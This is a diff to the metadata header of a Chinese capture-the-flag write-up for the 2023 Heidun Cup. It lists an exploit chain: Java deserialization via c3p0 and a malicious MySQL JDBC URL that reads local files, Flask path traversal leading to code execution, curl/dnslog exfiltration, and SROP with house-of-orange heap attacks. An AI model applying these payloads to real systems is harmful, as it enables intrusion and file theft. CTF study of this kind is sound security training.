@@ -24,7 +24,18 @@ tags:
 - one_gadget
 - libc-2.27
 - SROP
-attack_chain: 反编译 jar 看 SecurityCheck 黑名单 → JdbcRowSetImpl+c3p0 userOverridesAsString+HexAsciiSerializedMap 触发 MySQL JDBC 读本地文件 → Flask 路由 /upload 目录穿越 + /install 装包 + /add 用 site.addpackage 加 Python 文件 → dnslog curl base64 外带 → mysqlbinlog 恢复 binlog → 正则 + 后 6 位匹配找 IOC → pwntools 连 pwn 远程 → SROP read /bin/sh → offbyone + house of orange 触发 sysmalloc + house of force 改 top chunk 任意地址 → 劫持 __malloc_hook → one_gadget 0x10a2fc
+attack_chain:
+- '反编译 jar 看 SecurityCheck 黑名单'
+- 'JdbcRowSetImpl+c3p0 userOverridesAsString+HexAsciiSerializedMap 触发 MySQL JDBC 读本地文件'
+- 'Flask 路由 /upload 目录穿越 + /install 装包 + /add 用 site.addpackage 加 Python 文件'
+- 'dnslog curl base64 外带'
+- 'mysqlbinlog 恢复 binlog'
+- '正则 + 后 6 位匹配找 IOC'
+- 'pwntools 连 pwn 远程'
+- 'SROP read /bin/sh'
+- 'offbyone + house of orange 触发 sysmalloc + house of force 改 top chunk 任意地址'
+- '劫持 __malloc_hook'
+- 'one_gadget 0x10a2fc'
 key_payload: MyBean.setDatabase("mysql://vps:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#") ; site.addpackage('/tmp/extract', 'exp1.py', None) ; kk = b'{>o<fi:`mjkj5daqd6fhugim~~rj5h=' 写 0x38 字节后接 SROP 链
 one_liner: c3p0+MySQL JDBC 读本地 + Flask 装包 RCE + SROP + house of orange 改 top chunk。
 lesson: 限制 TemplatesImpl 黑名单时 c3p0 HexAsciiSerializedMap + MySQL JDBC fileread 是高成功率的替代链。
@@ -85,6 +96,10 @@ prerequisites:
 - Flask site.addpackage Python 路径
 - house of orange + house of force + one_gadget 组合原理
 - SROP Sigreturn-Oriented Programming 构造
+contest_normalized: "黑盾杯"
+contest_year: 2023
+subcategory_guess: "deserialization"
+subcategory_guess: "file_upload"
 ---
 # 2023黑盾杯-WriteUp
 
